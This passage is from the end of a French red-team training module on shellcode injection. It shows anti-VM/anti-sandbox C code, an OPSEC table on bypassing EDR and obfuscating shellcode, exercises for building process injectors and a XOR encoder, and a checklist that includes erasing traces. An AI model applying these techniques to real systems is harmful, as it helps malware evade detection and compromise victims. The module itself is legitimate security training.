BOOL IsRunningInVM() {
    // Vérifier le nombre de CPU
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    if (si.dwNumberOfProcessors < 2) return TRUE;

    // Vérifier la RAM
    MEMORYSTATUSEX ms;
    ms.dwLength = sizeof(ms);
    GlobalMemoryStatusEx(&ms);
    if (ms.ullTotalPhys < 4ULL * 1024 * 1024 * 1024) return TRUE;  // < 4GB

    // Vérifier les drivers VM
    if (GetModuleHandleA("vmmouse.sys") != NULL) return TRUE;
    if (GetModuleHandleA("vmhgfs.sys") != NULL) return TRUE;

    return FALSE;
}

int main() {
    if (IsRunningInVM()) {
        printf("VM detectee, sortie.\n");
        return 0;
    }

    // Continuer l'injection...
}
```

### 9.3 OPSEC Best Practices

| Pratique | Description |
|----------|-------------|
| **Éviter RWX** | Utiliser RW puis changer en RX |
| **Encoder le shellcode** | XOR, AES, RC4, etc. |
| **Syscalls directs** | Bypasser les hooks EDR |
| **Délais aléatoires** | Sleep() avec jitter |
| **Pas de strings** | Obfusquer toutes les strings |
| **Vérifier VM/Sandbox** | Anti-debugging / anti-VM |
| **Process Hollowing** | Injecter dans un processus légitime |
| **PPID Spoofing** | Falsifier le parent process |

---

## 10. Comparaison des techniques

| Technique | Discrétion | Complexité | Détection EDR | Cas d'usage |
|-----------|------------|------------|---------------|-------------|
| **CreateRemoteThread** | Faible | Faible | Haute | PoC, tests |
| **NtCreateThreadEx** | Moyenne | Moyenne | Moyenne | Contournement basique |
| **QueueUserAPC** | Haute | Moyenne | Faible | Malwares avancés |
| **SetThreadContext** | Très haute | Haute | Faible | APT, rootkits |

---

## 11. Exercices pratiques

### Exercice 1 : Self-Injection basique

**Objectif :** Créer un programme qui injecte et exécute un shellcode dans son propre espace mémoire.

**Shellcode à utiliser :**
```c
// MessageBox "Exercice W28"
unsigned char shellcode[] =
    "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00...";
```

**Étapes :**
1. Allouer mémoire avec VirtualAlloc
2. Copier le shellcode avec memcpy
3. Créer un thread avec CreateThread
4. Attendre et nettoyer

### Exercice 2 : Remote Injection avec choix du PID

**Objectif :** Créer un injecteur qui prend un PID en argument et injecte un shellcode.

**Contraintes :**
- Vérifier que le processus existe
- Gérer les erreurs proprement
- Afficher des logs détaillés

### Exercice 3 : XOR Encoder/Decoder

**Objectif :** Encoder un shellcode avec XOR, puis le décoder à l'exécution.

**Étapes :**
1. Créer un script Python pour encoder le shellcode
2. Intégrer le shellcode encodé dans un programme C
3. Décoder à l'exécution
4. Exécuter le shellcode décodé

### Exercice 4 : Comparaison des techniques

**Objectif :** Implémenter les 4 techniques (CreateRemoteThread, NtCreateThreadEx, QueueUserAPC, SetThreadContext) et comparer leur efficacité.

**Méthode :**
1. Créer 4 programmes différents
2. Tester sur un processus cible (notepad.exe)
3. Observer avec Process Monitor
4. Noter quelles techniques sont détectées

---

## 12. Checklist Red Team

```ascii
AVANT L'INJECTION :
┌────────────────────────────────────────┐
│ [ ] Encoder le shellcode               │
│ [ ] Vérifier anti-VM / anti-sandbox    │
│ [ ] Utiliser syscalls directs          │
│ [ ] Éviter les strings hardcodées      │
│ [ ] Ajouter des délais aléatoires      │
└────────────────────────────────────────┘

PENDANT L'INJECTION :
┌────────────────────────────────────────┐
│ [ ] Utiliser RW → RX (pas RWX)         │
│ [ ] Choisir un processus légitime      │
│ [ ] Nettoyer les handles               │
│ [ ] Vérifier le succès à chaque étape  │
└────────────────────────────────────────┘

APRÈS L'INJECTION :
┌────────────────────────────────────────┐
│ [ ] Effacer les traces mémoire         │
│ [ ] Fermer tous les handles            │
│ [ ] Vérifier les logs Windows          │
│ [ ] Tester la détection EDR            │
└────────────────────────────────────────┘
```

---

## 13. Outils recommandés

### Génération de shellcode
- **msfvenom** (Metasploit) : `msfvenom -p windows/x64/...`
- **Donut** : Convertir EXE/DLL en shellcode
- **Shellter** : Injection dans PE existants

### Analyse
- **Process Monitor** : Observer les appels système
- **Process Hacker** : Voir les threads injectés
- **PE-bear** : Analyser les sections PE

### Debugging
- **x64dbg** : Déboguer l'injection
- **WinDbg** : Analyse avancée
- **API Monitor** : Tracer les API calls

---

## 14. Ressources complémentaires

### Documentation Microsoft
- [CreateRemoteThread](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread)
- [VirtualAllocEx](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex)
- [QueueUserAPC](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-queueuserapc)

### Articles avancés
- **Injection techniques** : [https://attack.mitre.org/techniques/T1055/](https://attack.mitre.org/techniques/T1055/)
- **PEB Walking** : [https://www.ired.team/offensive-security/code-injection-process-injection/peb-walk-for-api-resolution](https://www.ired.team/offensive-security/code-injection-process-injection/peb-walk-for-api-resolution)
- **Syscalls directs** : [https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/](https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/)

### Labs pratiques
- **HackTheBox** : Machines Windows
- **TryHackMe** : Room "Windows Exploitation"
- **Pentester Academy** : Windows Red Team Lab

---

## 15. Conclusion

Le **shellcode injection** est une technique fondamentale en Red Teaming. Vous avez maintenant :

1. Compris ce qu'est un shellcode et son fonctionnement
2. Appris 4 techniques d'injection (CreateRemoteThread, NtCreateThreadEx, QueueUserAPC, SetThreadContext)
3. Découvert le Position-Independent Code
4. Exploré l'encodage et l'obfuscation
5. Intégré les bonnes pratiques OPSEC

**Prochaines étapes :**
- Module W29 : Process Hollowing
- Module W30 : DLL Injection
- Module W31 : Reflective DLL Injection

**Points clés à retenir :**

```ascii
┌───────────────────────────────────────────┐
│ SHELLCODE = Code machine injecté          │
│ PIC = Position-Independent (essentiel)    │
│ Encoder = Contourner les signatures AV    │
│ OPSEC = RW→RX, syscalls, anti-VM          │
│ 4 techniques = Choisir selon le contexte  │
└───────────────────────────────────────────┘
```

Passez maintenant aux exercices pratiques pour consolider vos connaissances !
